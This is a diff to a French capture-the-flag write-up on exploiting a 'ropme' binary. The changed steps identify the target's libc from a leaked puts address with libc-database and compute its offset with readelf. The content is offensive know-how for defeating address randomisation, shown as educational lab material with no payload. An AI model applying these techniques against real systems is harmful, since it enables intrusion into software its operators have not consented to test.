@@ -349,17 +349,19 @@ Pour notre exploitation nous avons besoin de :
 gef➤  p main
 $2 = {<text variable, no debug info>} 0x400626 <main>
 ```
-5. Trouver la libc linké au binaire :
+5. Trouver la libc linké au binaire grâce à [libc-database](https://github.com/niklasb/libc-database) et à l'adresse de puts que nous avons leak :
 ```py
+Local :
 ❯ ldd ropme
 	linux-vdso.so.1 (0x00007fffb6fe5000)
 	libc.so.6 => /usr/lib/libc.so.6 (0x00007f032bb05000)
-	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f032bd0b000)
-```
-6. Obtenir l'adresse de **puts** dans la **libc utilisé** avec [libc-database](https://github.com/niklasb/libc-database), pour calculer l'adresse de la base de la libc :
-```py
+	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f032bd0b000)*
+Remote :
 ❯ ./find puts 690 # find symbol address_leaked
 libc6_2.23-0ubuntu10_amd64.so (local-56d992a0342a67a887b8dcaae381d2cc51205253)
+```
+6. Obtenir l'adresse de **puts** dans la **libc utilisé**, pour calculer l'adresse de la base de la libc :
+```py
 ❯ readelf -s libc6_2.23-0ubuntu10_amd64.so | grep 'puts@@GLIBC'
    186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
    404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
